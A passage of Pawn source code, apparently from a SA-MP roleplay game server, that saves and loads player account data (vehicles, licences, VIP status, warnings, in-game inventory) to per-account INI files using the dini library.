			dini_IntSet(file, "vVVMTrunkMaterial", Player[playerid][pvvMTMaterials]);
			dini_IntSet(file, "vVVHTrunkMaterial", Player[playerid][pvvHTMaterials]);
			dini_IntSet(file, "vVVVLTrunkMaterial", Player[playerid][pvvvLTMaterials]);
			dini_IntSet(file, "vVVVMTrunkMaterial", Player[playerid][pvvvMTMaterials]);
			dini_IntSet(file, "vVVVHTrunkMaterial", Player[playerid][pvvvHTMaterials]);
			dini_IntSet(file, "Contract", Player[playerid][pContract]);
			dini_Set(file, "ContractBy", Player[playerid][pContractBy]);
			dini_IntSet(file, "Tutorial", Player[playerid][pTutorial]);
			dini_IntSet(file, "Warns", Player[playerid][pWarns]);
			dini_Set(file, "Warn1", Player[playerid][pWarn1]);
			dini_Set(file, "Warn2", Player[playerid][pWarn2]);
			dini_Set(file, "Warn3", Player[playerid][pWarn3]);
			dini_Set(file, "Flag", Player[playerid][pFlag]);
			dini_IntSet(file, "NMute", Player[playerid][pNMute]);
			dini_IntSet(file, "SpawnFreeze", Player[playerid][pSpawnFreeze]);
			dini_IntSet(file, "Fam", Player[playerid][pFam]);
			dini_IntSet(file, "FamRank", Player[playerid][pFamRank]);
			dini_IntSet(file, "CSuccess", Player[playerid][pCSuccess]);
			dini_IntSet(file, "CFail", Player[playerid][pCFail]);
			dini_IntSet(file, "Mask", Player[playerid][pMask]);
			dini_IntSet(file, "Masked", Player[playerid][pMasked]);
			dini_IntSet(file, "Helper", Player[playerid][pHelper]);
			dini_IntSet(file, "NWarns", Player[playerid][pNWarns]);
			dini_IntSet(file, "RWarns", Player[playerid][pRWarns]);
			dini_IntSet(file, "RMute", Player[playerid][pRMute]);
			dini_IntSet(file, "pDead", Player[playerid][pDead]);
			dini_IntSet(file, "pRadarGun", Player[playerid][pRadarGun]);
			dini_IntSet(file, "Famed", Player[playerid][pFamed]);
			dini_IntSet(file, "FamedPoints", Player[playerid][pFamedPoints]);
			dini_IntSet(file, "Moderator", Player[playerid][pStaffObserver]);
			dini_IntSet(file, "Mapper", Player[playerid][pMapper]);
			dini_IntSet(file, "scripter", Player[playerid][pScripters]);
			dini_IntSet(file, "GangMod", Player[playerid][pGangMod]);
			dini_IntSet(file, "FacMod", Player[playerid][pFacMod]);
			dini_IntSet(file, "BanAppealer", Player[playerid][pBanAppealer]);
			dini_IntSet(file, "CarLicense", Player[playerid][pCarLic]);
			dini_Set(file, "Accent", Player[playerid][pAccent]);
			dini_IntSet(file, "VIP", Player[playerid][pVIP]);
			dini_IntSet(file, "VIPPoints", Player[playerid][pVIPPoints]);
			dini_IntSet(file, "VIPBuddy", Player[playerid][pVIPBuddy]);
			dini_IntSet(file, "VIPDay", Player[playerid][pVIPDay]);
			dini_IntSet(file, "VIPMonth", Player[playerid][pVIPMonth]);
			dini_IntSet(file, "VIPHour", Player[playerid][pVIPHour]);
			dini_IntSet(file, "VIPJob", Player[playerid][pVIPJob]);
			dini_IntSet(file, "VIPTemp", Player[playerid][pVIPTemp]);
			// VIP Spawn
			dini_FloatSet(file, "vSpawnX", Player[playerid][vSpawnX]);
			dini_FloatSet(file, "vSpawnY", Player[playerid][vSpawnY]);
			dini_FloatSet(file, "vSpawnZ", Player[playerid][vSpawnZ]);
			dini_IntSet(file, "DeliverTruck", Player[playerid][pDeliverTruck]);
			dini_IntSet(file, "New", Player[playerid][pNew]);
			dini_IntSet(file, "RefPoints", Player[playerid][pRefPoints]);
			dini_IntSet(file, "Tester", Player[playerid][pTester]);
			dini_IntSet(file, "FightStyle", Player[playerid][pFightStyle]);
			dini_IntSet(file, "Scope", Player[playerid][pScope]);
			dini_IntSet(file, "Cookie", Player[playerid][pCookie]);
			dini_IntSet(file, "Oldskool", Player[playerid][pOldskool]);
			dini_IntSet(file, "Reward", Player[playerid][pReward]);
			dini_IntSet(file, "Fish1", Player[playerid][pFish][0]);
			dini_IntSet(file, "Fish2", Player[playerid][pFish][1]);
			dini_IntSet(file, "Fish3", Player[playerid][pFish][2]);
			dini_IntSet(file, "Fish4", Player[playerid][pFish][3]);
			dini_IntSet(file, "Fish5", Player[playerid][pFish][4]);
			dini_IntSet(file, "FishLic", Player[playerid][pFishLic]);
			dini_IntSet(file, "GunLic", Player[playerid][pGunLic]);
			dini_IntSet(file, "FlyLic", Player[playerid][pFlyLic]);
			dini_IntSet(file, "Walk", Player[playerid][pWalk]);
			// First Car
        	dini_IntSet(file, "vModel", Player[playerid][vModel]);
         	dini_FloatSet(file, "vX", Player[playerid][vX]);
        	dini_FloatSet(file, "vY", Player[playerid][vY]);
        	dini_FloatSet(file, "vZ", Player[playerid][vZ]);
        	dini_FloatSet(file, "vA", Player[playerid][vA]);
          	dini_IntSet(file, "vC1", Player[playerid][vC1]);
         	dini_IntSet(file, "vC2", Player[playerid][vC2]);
          	dini_IntSet(file, "vPJ", Player[playerid][vPJ]);
          	dini_IntSet(file, "vLocked", Player[playerid][vLocked]);
           	dini_IntSet(file, "vModSlot0",Player[playerid][pVehMod][0]);
          	dini_IntSet(file, "vModSlot1",Player[playerid][pVehMod][1]);
           	dini_IntSet(file, "vModSlot2",Player[playerid][pVehMod][2]);
         	dini_IntSet(file, "vModSlot3",Player[playerid][pVehMod][3]);
           	dini_IntSet(file, "vModSlot4",Player[playerid][pVehMod][4]);
        	dini_IntSet(file, "vModSlot5",Player[playerid][pVehMod][5]);
          	dini_IntSet(file, "vModSlot6",Player[playerid][pVehMod][6]);
        	dini_IntSet(file, "vModSlot7",Player[playerid][pVehMod][7]);
        	dini_IntSet(file, "vModSlot8",Player[playerid][pVehMod][8]);
          	dini_IntSet(file, "vModSlot9",Player[playerid][pVehMod][9]);
         	dini_IntSet(file, "vModSlot10",Player[playerid][pVehMod][10]);
         	dini_IntSet(file, "vModSlot11",Player[playerid][pVehMod][11]);
        	dini_IntSet(file, "vModSlot12",Player[playerid][pVehMod][12]);
          	dini_IntSet(file, "vModSlot13",Player[playerid][pVehMod][13]);
          	// Second Car
           	dini_IntSet(file, "vVModel", Player[playerid][vVModel]);
          	dini_FloatSet(file, "vVX", Player[playerid][vVX]);
          	dini_FloatSet(file, "vVY", Player[playerid][vVY]);
         	dini_FloatSet(file, "vVZ", Player[playerid][vVZ]);
           	dini_FloatSet(file, "vVA", Player[playerid][vVA]);
          	dini_IntSet(file, "vVC1", Player[playerid][vVC1]);
           	dini_IntSet(file, "vVC2", Player[playerid][vVC2]);
          	dini_IntSet(file, "vVPJ", Player[playerid][vVPJ]);
           	dini_IntSet(file, "vVLocked", Player[playerid][vVLocked]);
           	dini_IntSet(file, "vVModSlot0",Player[playerid][pVVehMod][0]);
           	dini_IntSet(file, "vVModSlot1",Player[playerid][pVVehMod][1]);
          	dini_IntSet(file, "vVModSlot2",Player[playerid][pVVehMod][2]);
        	dini_IntSet(file, "vVModSlot3",Player[playerid][pVVehMod][3]);
           	dini_IntSet(file, "vVModSlot4",Player[playerid][pVVehMod][4]);
           	dini_IntSet(file, "vVModSlot5",Player[playerid][pVVehMod][5]);
           	dini_IntSet(file, "vVModSlot6",Player[playerid][pVVehMod][6]);
          	dini_IntSet(file, "vVModSlot7",Player[playerid][pVVehMod][7]);
           	dini_IntSet(file, "vVModSlot8",Player[playerid][pVVehMod][8]);
        	dini_IntSet(file, "vVModSlot9",Player[playerid][pVVehMod][9]);
           	dini_IntSet(file, "vVModSlot10",Player[playerid][pVVehMod][10]);
        	dini_IntSet(file, "vVModSlot11",Player[playerid][pVVehMod][11]);
        	dini_IntSet(file, "vVModSlot12",Player[playerid][pVVehMod][12]);
        	dini_IntSet(file, "vVModSlot13",Player[playerid][pVVehMod][13]);
        	// Third Car
        	dini_IntSet(file, "vVVModel", Player[playerid][vVVModel]);
        	dini_FloatSet(file, "vVVX", Player[playerid][vVVX]);
        	dini_FloatSet(file, "vVVY", Player[playerid][vVVY]);
        	dini_FloatSet(file, "vVVZ", Player[playerid][vVVZ]);
        	dini_FloatSet(file, "vVVA", Player[playerid][vVVA]);
        	dini_IntSet(file, "vVVC1", Player[playerid][vVVC1]);
         	dini_IntSet(file, "vVVC2", Player[playerid][vVVC2]);
          	dini_IntSet(file, "vVVPJ", Player[playerid][vVVPJ]);
          	dini_IntSet(file, "vVVLocked", Player[playerid][vVVLocked]);
            dini_IntSet(file, "vVVModSlot0",Player[playerid][pVVVehMod][0]);
          	dini_IntSet(file, "vVVModSlot1",Player[playerid][pVVVehMod][1]);
         	dini_IntSet(file, "vVVModSlot2",Player[playerid][pVVVehMod][2]);
          	dini_IntSet(file, "vVVModSlot3",Player[playerid][pVVVehMod][3]);
         	dini_IntSet(file, "vVVModSlot4",Player[playerid][pVVVehMod][4]);
         	dini_IntSet(file, "vVVModSlot5",Player[playerid][pVVVehMod][5]);
         	dini_IntSet(file, "vVVModSlot6",Player[playerid][pVVVehMod][6]);
         	dini_IntSet(file, "vVVModSlot7",Player[playerid][pVVVehMod][7]);
          	dini_IntSet(file, "vVVModSlot8",Player[playerid][pVVVehMod][8]);
        	dini_IntSet(file, "vVVModSlot9",Player[playerid][pVVVehMod][9]);
        	dini_IntSet(file, "vVVModSlot10",Player[playerid][pVVVehMod][10]);
         	dini_IntSet(file, "vVVModSlot11",Player[playerid][pVVVehMod][11]);
         	dini_IntSet(file, "vVVModSlot12",Player[playerid][pVVVehMod][12]);
        	dini_IntSet(file, "vVVModSlot13",Player[playerid][pVVVehMod][13]);
        	// Fourth Car
           	dini_IntSet(file, "vVVVModel", Player[playerid][vVVVModel]);
        	dini_FloatSet(file, "vVVVX", Player[playerid][vVVVX]);
         	dini_FloatSet(file, "vVVVY", Player[playerid][vVVVY]);
          	dini_FloatSet(file, "vVVVZ", Player[playerid][vVVVZ]);
        	dini_FloatSet(file, "vVVVA", Player[playerid][vVVVA]);
           	dini_IntSet(file, "vVVVC1", Player[playerid][vVVVC1]);
          	dini_IntSet(file, "vVVVC2", Player[playerid][vVVVC2]);
         	dini_IntSet(file, "vVVVPJ", Player[playerid][vVVVPJ]);
          	dini_IntSet(file, "vVVVLocked", Player[playerid][vVVVLocked]);
            dini_IntSet(file, "vVVVModSlot0",Player[playerid][pVVVVehMod][0]);
         	dini_IntSet(file, "vVVVModSlot1",Player[playerid][pVVVVehMod][1]);
         	dini_IntSet(file, "vVVVModSlot2",Player[playerid][pVVVVehMod][2]);
        	dini_IntSet(file, "vVVVModSlot3",Player[playerid][pVVVVehMod][3]);
        	dini_IntSet(file, "vVVVModSlot4",Player[playerid][pVVVVehMod][4]);
         	dini_IntSet(file, "vVVVModSlot5",Player[playerid][pVVVVehMod][5]);
           	dini_IntSet(file, "vVVVModSlot6",Player[playerid][pVVVVehMod][6]);
         	dini_IntSet(file, "vVVVModSlot7",Player[playerid][pVVVVehMod][7]);
         	dini_IntSet(file, "vVVVModSlot8",Player[playerid][pVVVVehMod][8]);
         	dini_IntSet(file, "vVVVModSlot9",Player[playerid][pVVVVehMod][9]);
          	dini_IntSet(file, "vVVVModSlot10",Player[playerid][pVVVVehMod][10]);
          	dini_IntSet(file, "vVVVModSlot11",Player[playerid][pVVVVehMod][11]);
           	dini_IntSet(file, "vVVVModSlot12",Player[playerid][pVVVVehMod][12]);
          	dini_IntSet(file, "vVVVModSlot13",Player[playerid][pVVVVehMod][13]);
          	// Upgrade Points
          	dini_IntSet(file, "UpgradePoints", Player[playerid][pUpgradePoints]);
			dini_IntSet(file, "ArmorUpgrade", Player[playerid][pArmorUpgrade]);
			dini_IntSet(file, "HealthUpgrade", Player[playerid][pHealthUpgrade]);
			//Special Weapon
			dini_IntSet(file, "SpecialWeapon", Player[playerid][pSpecialWeapon]);
			// Gates
			dini_IntSet(file, "Gate1", Player[playerid][pGate][0]);
			dini_IntSet(file, "Gate2", Player[playerid][pGate][1]);
			dini_IntSet(file, "Gate3", Player[playerid][pGate][2]);
			// Special Tags
			dini_Set(file, "Tag", Player[playerid][pTag]);
			// Special Name
			dini_Set(file, "SName", Player[playerid][pSName]);
			SaveToys(playerid, file);
		}
	}
	return 1;
}

stock LoadChar(playerid)
{
    new file[64];
	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	// Logged in
	Player[playerid][pLoggedIn] = 1;
	Player[playerid][pSpawn] = 1;
	// Load
	format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
	Player[playerid][pGender] = dini_Int(file, "Gender");
	Player[playerid][pLevel] = dini_Int(file, "Level");
	if(Player[playerid][pLevel] == 0) Player[playerid][pLevel] = 1;
	Player[playerid][pMinutes] = dini_Int(file, "Minutes");
	Player[playerid][pHours] = dini_Int(file, "Hours");
	Player[playerid][pExp] = dini_Int(file, "Exp");
	Player[playerid][pAge] = dini_Int(file, "Age");
	Player[playerid][pMoney] = dini_Int(file, "Cash");
	Player[playerid][pColor] = dini_Int(file, "Color");
	Player[playerid][pBank] = dini_Int(file, "Bank");
	Player[playerid][pModel] = dini_Int(file, "Model");
	Player[playerid][pAdmin] = dini_Int(file, "Admin");
	Player[playerid][pAdminLocked] = dini_Int(file, "AdminLocked");
	Player[playerid][pGangMod] = dini_Int(file, "GangMod");
	Player[playerid][pFacMod] = dini_Int(file, "FacMod");
	Player[playerid][pBanned] = dini_Int(file, "pBanned");
	Player[playerid][pEBanned] = dini_Int(file, "pEBanned");
	Player[playerid][pX]  = dini_Float(file, "X");
	Player[playerid][pY] = dini_Float(file, "Y");
	Player[playerid][pZ] = dini_Float(file, "Z");
	Player[playerid][pInt] = dini_Int(file, "Int");
	Player[playerid][pVW] = dini_Int(file, "VW");
	Player[playerid][pxX]  = dini_Float(file, "xX");
	Player[playerid][pyY] = dini_Float(file, "yY");
	Player[playerid][pzZ] = dini_Float(file, "zZ");
	Player[playerid][pFac] = dini_Int(file, "Fac");
	Player[playerid][pFacRank] = dini_Int(file, "FacRank");
	Player[playerid][pFacLeader] = dini_Int(file, "FacLeader");
	Player[playerid][pFacDiv] = dini_Int(file, "FacDiv");
	Player[playerid][pFacDivLeader] = dini_Int(file, "FacDivLeader");
	Player[playerid][pFacDuty] = dini_Int(file, "Duty");
	Player[playerid][pWeapon][0] = dini_Int(file, "wSlot0");
	Player[playerid][pWeaponAmmo][0] = dini_Int(file, "wSlot0Ammo");
	Player[playerid][pWeapon][1] = dini_Int(file, "wSlot1");
	Player[playerid][pWeaponAmmo][1] = dini_Int(file, "wSlot1Ammo");
	Player[playerid][pWeapon][2] = dini_Int(file, "wSlot2");
	Player[playerid][pWeaponAmmo][2] = dini_Int(file, "wSlot2Ammo");
	Player[playerid][pWeapon][3] = dini_Int(file, "wSlot3");
	Player[playerid][pWeaponAmmo][3] = dini_Int(file, "wSlot3Ammo");
	Player[playerid][pWeapon][4] = dini_Int(file, "wSlot4");
	Player[playerid][pWeaponAmmo][4] = dini_Int(file, "wSlot4Ammo");
	Player[playerid][pWeapon][5] = dini_Int(file, "wSlot5");
	Player[playerid][pWeaponAmmo][5] = dini_Int(file, "wSlot5Ammo");
	Player[playerid][pWeapon][6] = dini_Int(file, "wSlot6");
	Player[playerid][pWeaponAmmo][6] = dini_Int(file, "wSlot6Ammo");
	Player[playerid][pWeapon][7] = dini_Int(file, "wSlot7");
	Player[playerid][pWeaponAmmo][7] = dini_Int(file, "wSlot7Ammo");
	Player[playerid][pWeapon][8] = dini_Int(file, "wSlot8");
	Player[playerid][pWeaponAmmo][8] = dini_Int(file, "wSlot8Ammo");
	Player[playerid][pWeapon][9] = dini_Int(file, "wSlot9");
	Player[playerid][pWeaponAmmo][9] = dini_Int(file, "wSlot9Ammo");
	Player[playerid][pWeapon][10] = dini_Int(file, "wSlot10");
	Player[playerid][pWeaponAmmo][10] = dini_Int(file, "wSlot10Ammo");
	Player[playerid][pWeapon][11] = dini_Int(file, "wSlot11");
	Player[playerid][pWeaponAmmo][11] = dini_Int(file, "wSlot11Ammo");
	Player[playerid][pWeapon][12] = dini_Int(file, "wSlot12");
	Player[playerid][pWeaponAmmo][12] = dini_Int(file, "wSlot12Ammo");
	Player[playerid][pHospital] = dini_Int(file, "Hospital");
	Player[playerid][pBiz] = dini_Int(file, "Business");
	Player[playerid][pSafeAdmin] = dini_Int(file, "HouseOwner");
	Player[playerid][pVBiz] = dini_Int(file, "VBusiness");
	Player[playerid][pOwner] = dini_Int(file, "BizOwner");
	Player[playerid][pJob] = dini_Int(file, "Job");
	Player[playerid][pJobSkill][JOB_MECHANIC] = dini_Int(file, "Mechanic");
	Player[playerid][pJobSkill][JOB_LAWYER] = dini_Int(file, "Lawyer");
	Player[playerid][pJobSkill][JOB_TRUCKER] = dini_Int(file, "Trucker");
	Player[playerid][pJobSkill][JOB_FISHER] = dini_Int(file, "Fisher");
	Player[playerid][pJobSkill][JOB_WDEALER] = dini_Int(file, "WDealer");
	Player[playerid][pJobSkill][JOB_WSMUGGLER] = dini_Int(file, "WSmuggler");
	Player[playerid][pJobSkill][JOB_DDEALER] = dini_Int(file, "DDealer");
	Player[playerid][pJobSkill][JOB_DSMUGGLER] = dini_Int(file, "DSmuggler");
	Player[playerid][pJobSkill][JOB_CARJACKER] = dini_Int(file, "CarJacker");
    Player[playerid][pJobSkill][JOB_FISHER] = dini_Int(file, "Fisher");
	Player[playerid][pTPackages] = dini_Int(file, "TPackages");
	Player[playerid][pLMPackages] = dini_Int(file, "LMPackages");
	Player[playerid][pMMPackages] = dini_Int(file, "MMPackages");
	Player[playerid][pHMPackages] = dini_Int(file, "HMPackages");
	Player[playerid][pLMaterials] = dini_Int(file, "LMaterials");
	Player[playerid][pMMaterials] = dini_Int(file, "MMaterials");
	Player[playerid][pHMaterials] = dini_Int(file, "HMaterials");
	Player[playerid][pHasCellphone] = dini_Int(file, "HasCellphone");
	Player[playerid][pBoombox] = dini_Int(file, "Boombox");
	Player[playerid][pAUXCord] = dini_Int(file, "AUX Cord");
	Player[playerid][pCDPlayer] = dini_Int(file, "MP3 Player");
	Player[playerid][pPhone] = 	dini_Int(file, "Cellphone");
	Player[playerid][pPhonebook] = 	dini_Int(file, "Phonebook");
	Player[playerid][pDice] = dini_Int(file, "Dice");
	Player[playerid][pCigar] = dini_Int(file, "Cigar");
	Player[playerid][pSpeedo] = dini_Int(file, "Speedo");
	Player[playerid][pSprunk] = dini_Int(file, "Sprunk");
	Player[playerid][pSpray] = dini_Int(file, "Spray");
	Player[playerid][pRope] = dini_Int(file, "Rope");
	Player[playerid][pBlindfold] = dini_Int(file, "Blindfold");
	Player[playerid][pMaterials] = dini_Int(file, "Materials");
 	Player[playerid][pWT] = dini_Int(file, "WT");
	Player[playerid][pWTC] = dini_Int(file, "WTC");
	Player[playerid][pGas] = dini_Int(file, "Gas");
	Player[playerid][pRadio] = dini_Int(file, "Radio");
	Player[playerid][pHealth] = dini_Float(file, "Health");
	Player[playerid][pArmor] = dini_Float(file, "Armor");
	Player[playerid][pInternet] = dini_Int(file, "Internet");
	Player[playerid][pSong][1] = dini_Int(file, "Song1");
	Player[playerid][pSong][2] = dini_Int(file, "Song2");
	Player[playerid][pJail] = dini_Int(file, "Jail");
	Player[playerid][pJailTime] = dini_Int(file, "JailTime");
	format(Player[playerid][pJailReason], 64, "%s", dini_Get(file, "JailReason"));
	format(Player[playerid][pJailBy], 32, "%s", dini_Get(file, "JailBy"));
	Player[playerid][pPrison] = dini_Int(file, "Prison");
	Player[playerid][pPrisonTime] = dini_Int(file, "PrisonTime");
	format(Player[playerid][pPrisonReason], 64, "%s", dini_Get(file, "PrisonReason"));
	format(Player[playerid][pPrisonBy], 32, "%s", dini_Get(file, "PrisonBy"));
	Player[playerid][pWanted] = dini_Int(file, "Wanted");
	format(Player[playerid][pWanted1], 64, "%s", dini_Get(file, "Wanted1"));
	format(Player[playerid][pWanted2], 64, "%s", dini_Get(file, "Wanted2"));
	format(Player[playerid][pWanted3], 64, "%s", dini_Get(file, "Wanted3"));
	format(Player[playerid][pWanted4], 64, "%s", dini_Get(file, "Wanted4"));
	format(Player[playerid][pWanted5], 64, "%s", dini_Get(file, "Wanted5"));
	format(Player[playerid][pWanted6], 64, "%s", dini_Get(file, "Wanted6"));
	Player[playerid][pCrimes] = dini_Int(file, "Crimes");
	Player[playerid][pArrested] = dini_Int(file, "Arrested");
	Player[playerid][pDPackages] = dini_Int(file, "DPackages");
	Player[playerid][pWeed] = dini_Int(file, "Weed");
	Player[playerid][pWeed] = dini_Int(file, "Weed");
	Player[playerid][pSeeds] = dini_Int(file, "Seeds");
	Player[playerid][pCocaine] = dini_Int(file, "cocaine");
	Player[playerid][pTWeed] = dini_Int(file, "TrunkWeed");
	Player[playerid][pTCocaine] = dini_Int(file, "TrunkCocaine");
	Player[playerid][pvTWeed] = dini_Int(file, "vTrunkWeed");
	Player[playerid][pvTCocaine] = dini_Int(file, "vTrunkCocaine");
	Player[playerid][pvVVTWeed] = dini_Int(file, "vVTrunkWeed");
	Player[playerid][pvVTCocaine] = dini_Int(file, "vVTrunkCocaine");
	Player[playerid][pvVVTWeed] = dini_Int(file, "vVVTrunkWeed");
	Player[playerid][pvVVTCocaine] = dini_Int(file, "vVVTrunkCocaine");
	Player[playerid][pLTMaterials] = dini_Int(file, "vLowTrunkMaterial");
	Player[playerid][pMTMaterials] = dini_Int(file, "vMediumTrunkMaterial");
	Player[playerid][pHTMaterials] = dini_Int(file, "vHighTrunkMaterial");
	Player[playerid][pvLTMaterials] = dini_Int(file, "vVLowTrunkMaterial");
	Player[playerid][pvMTMaterials] = dini_Int(file, "vVMediumTrunkMaterial");
	Player[playerid][pvHTMaterials] = dini_Int(file, "vVHighTrunkMaterial");
	Player[playerid][pvvLTMaterials] = dini_Int(file, "vVVLTrunkMaterial");
	Player[playerid][pvvMTMaterials] = dini_Int(file, "vVVMTrunkMaterial");
	Player[playerid][pvvHTMaterials] = dini_Int(file, "vVVHTrunkMaterial");
	Player[playerid][pvvvLTMaterials] = dini_Int(file, "vVVVLTrunkMaterial");
	Player[playerid][pvvvMTMaterials] = dini_Int(file, "vVVVMTrunkMaterial");
	Player[playerid][pvvvHTMaterials] = dini_Int(file, "vVVVHTrunkMaterial");
	Player[playerid][pContract] = dini_Int(file, "Contract");
	format(Player[playerid][pContractBy], 32, "%s", dini_Get(file, "ContractBy"));
	Player[playerid][pTutorial] = dini_Int(file, "Tutorial");
	Player[playerid][pWarns] = dini_Int(file, "Warns");
	format(Player[playerid][pWarn1], 64, "%s", dini_Get(file, "Warn1"));
	format(Player[playerid][pWarn2], 64, "%s", dini_Get(file, "Warn2"));
	format(Player[playerid][pWarn3], 64, "%s", dini_Get(file, "Warn3"));
	format(Player[playerid][pFlag], 64, "%s", dini_Get(file, "Flag"));
	Player[playerid][pNMute] = dini_Int(file, "NMute");
	Player[playerid][pSpawnFreeze] = dini_Int(file, "SpawnFreeze");
	Player[playerid][pFam] = dini_Int(file, "Fam");
	Player[playerid][pFamRank] = dini_Int(file, "FamRank");
	Player[playerid][pCSuccess] = dini_Int(file, "CSuccess");
	Player[playerid][pMask] = dini_Int(file, "Mask");
	Player[playerid][pMasked] = dini_Int(file, "Masked");
	Player[playerid][pCFail] = dini_Int(file, "CFail");
	Player[playerid][pHouse] = dini_Int(file, "House");
	Player[playerid][pVHouse] = dini_Int(file, "vHouse");
	Player[playerid][pGarage] = dini_Int(file, "Garage");
	Player[playerid][pVGarage] = dini_Int(file, "VGarage");
	Player[playerid][pHelper] = dini_Int(file, "Helper");
	Player[playerid][pNWarns] = dini_Int(file, "NWarns");
	Player[playerid][pRWarns] = dini_Int(file, "RWarns");
	Player[playerid][pRMute] = dini_Int(file, "RMute");
	Player[playerid][pDead] = dini_Int(file, "pDead");
	Player[playerid][pRadarGun] = dini_Int(file, "pRadarGun");
	Player[playerid][pFamed] = dini_Int(file, "Famed");
	Player[playerid][pFamedPoints] = dini_Int(file, "FamedPoints");
	Player[playerid][pMapper] = dini_Int(file, "Mapper");
	Player[playerid][pScripters] = dini_Int(file, "scripter");
	Player[playerid][pStaffObserver] = dini_Int(file, "Moderator");
	Player[playerid][pGangMod] = dini_Int(file, "GangMod");
	Player[playerid][pFacMod] = dini_Int(file, "FacMod");
	Player[playerid][pBanAppealer] = dini_Int(file, "BanAppealer");
	Player[playerid][pCarLic] = dini_Int(file, "CarLicense");
	format(Player[playerid][pAccent], 16, "%s", dini_Get(file, "Accent"));
	Player[playerid][pVIP] = dini_Int(file, "VIP");
	Player[playerid][pVIPPoints] = dini_Int(file, "VIPPoints");
	Player[playerid][pVIPBuddy] = dini_Int(file, "VIPBuddy");
	Player[playerid][pVIPDay] = dini_Int(file, "VIPDay");
	Player[playerid][pVIPMonth] = dini_Int(file, "VIPMonth");
	Player[playerid][pVIPHour] = dini_Int(file, "VIPDayHour");
	Player[playerid][pVIPTemp] = dini_Int(file, "VIPTemp");
	Player[playerid][vSpawnX] = dini_Float(file, "vSpawnX");
	Player[playerid][vSpawnY] = dini_Float(file, "vSpawnY");
	Player[playerid][vSpawnZ] = dini_Float(file, "vSpawnZ");
	Player[playerid][pVIPJob] = dini_Int(file, "VIPJob");
	Player[playerid][pDeliverTruck] = dini_Int(file, "DeliverTruck");
	Player[playerid][pNew] = dini_Int(file, "New");
	Player[playerid][pRefPoints] = dini_Int(file, "RefPoints");
	Player[playerid][pTester] = dini_Int(file, "Tester");
	Player[playerid][pFightStyle] = dini_Int(file, "FightStyle");
	SetPlayerFightingStyle(playerid, Player[playerid][pFightStyle]);
	Player[playerid][pScope] = dini_Int(file, "Scope");
	Player[playerid][pCookie] = dini_Int(file, "Cookie");
	Player[playerid][pOldskool] = dini_Int(file, "Oldskool");
	Player[playerid][pReward] = dini_Int(file, "Reward");
	Player[playerid][pFish][0] = dini_Int(file, "Fish1");
	Player[playerid][pFish][1] = dini_Int(file, "Fish2");
	Player[playerid][pFish][2] = dini_Int(file, "Fish3");
	Player[playerid][pFish][3] = dini_Int(file, "Fish4");
	Player[playerid][pFish][4] = dini_Int(file, "Fish5");
	Player[playerid][pFlyLic] = dini_Int(file, "FlyLic");
	Player[playerid][pFishLic] = dini_Int(file, "FishLic");
	Player[playerid][pGunLic] = dini_Int(file, "GunLic");
	Player[playerid][pWalk] = dini_Int(file, "Walk");
 	// First Car
    Player[playerid][vModel] = dini_Int(file, "vModel");
  	Player[playerid][vX] = dini_Float(file, "vX");
	Player[playerid][vY] = dini_Float(file, "vY");
	Player[playerid][vZ] = dini_Float(file, "vZ");
	Player[playerid][vA] = dini_Float(file, "vA");
	Player[playerid][vC1] = dini_Int(file, "vC1");
	Player[playerid][vC2] = dini_Int(file, "vC2");
	Player[playerid][vPJ] = dini_Int(file, "vPJ");
	Player[playerid][vLocked] = dini_Int(file, "vLocked");
	Player[playerid][pVehMod][0] = dini_Int(file, "vModSlot0");
	Player[playerid][pVehMod][1] = dini_Int(file, "vModSlot1");
	Player[playerid][pVehMod][2] = dini_Int(file, "vModSlot2");
	Player[playerid][pVehMod][3] = dini_Int(file, "vModSlot3");
	Player[playerid][pVehMod][4] = dini_Int(file, "vModSlot4");
	Player[playerid][pVehMod][5] = dini_Int(file, "vModSlot5");
	Player[playerid][pVehMod][6] = dini_Int(file, "vModSlot6");
	Player[playerid][pVehMod][7] = dini_Int(file, "vModSlot7");
	Player[playerid][pVehMod][8] = dini_Int(file, "vModSlot8");
	Player[playerid][pVehMod][9] = dini_Int(file, "vModSlot9");
	Player[playerid][pVehMod][10] = dini_Int(file, "vModSlot10");
	Player[playerid][pVehMod][11] = dini_Int(file, "vModSlot11");
	Player[playerid][pVehMod][12] = dini_Int(file, "vModSlot12");
	Player[playerid][pVehMod][13] = dini_Int(file, "vModSlot13");
	// Second Car
	Player[playerid][vVModel] = dini_Int(file, "vVModel");
	Player[playerid][vVX] = dini_Float(file, "vVX");
	Player[playerid][vVY] = dini_Float(file, "vVY");
	Player[playerid][vVZ] = dini_Float(file, "vVZ");
	Player[playerid][vVA] = dini_Float(file, "vVA");
	Player[playerid][vVC1] = dini_Int(file, "vVC1");
	Player[playerid][vVC2] = dini_Int(file, "vVC2");
	Player[playerid][vVPJ] = dini_Int(file, "vVPJ");
	Player[playerid][vVLocked] = dini_Int(file, "vVLocked");
	Player[playerid][pVVehMod][0] = dini_Int(file, "vVModSlot0");
	Player[playerid][pVVehMod][1] = dini_Int(file, "vVModSlot1");
	Player[playerid][pVVehMod][2] = dini_Int(file, "vVModSlot2");
	Player[playerid][pVVehMod][3] = dini_Int(file, "vVModSlot3");
	Player[playerid][pVVehMod][4] = dini_Int(file, "vVModSlot4");
	Player[playerid][pVVehMod][5] = dini_Int(file, "vVModSlot5");
	Player[playerid][pVVehMod][6] = dini_Int(file, "vVModSlot6");
	Player[playerid][pVVehMod][7] = dini_Int(file, "vVModSlot7");
	Player[playerid][pVVehMod][8] = dini_Int(file, "vVModSlot8");
	Player[playerid][pVVehMod][9] = dini_Int(file, "vVModSlot9");
	Player[playerid][pVVehMod][10] = dini_Int(file, "vVModSlot10");
	Player[playerid][pVVehMod][11] = dini_Int(file, "vVModSlot11");
	Player[playerid][pVVehMod][12] = dini_Int(file, "vVModSlot12");
	Player[playerid][pVVehMod][13] = dini_Int(file, "vVModSlot13");
	// Third Car
	Player[playerid][vVVModel] = dini_Int(file, "vVVModel");
	Player[playerid][vVVX] = dini_Float(file, "vVVX");
	Player[playerid][vVVY] = dini_Float(file, "vVVY");
	Player[playerid][vVVZ] = dini_Float(file, "vVVZ");
	Player[playerid][vVVA] = dini_Float(file, "vVVA");
	Player[playerid][vVVC1] = dini_Int(file, "vVVC1");
	Player[playerid][vVVC2] = dini_Int(file, "vVVC2");
	Player[playerid][vVVPJ] = dini_Int(file, "vVVPJ");
	Player[playerid][vVVLocked] = dini_Int(file, "vVVLocked");
	Player[playerid][pVVVehMod][0] = dini_Int(file, "vVVModSlot0");
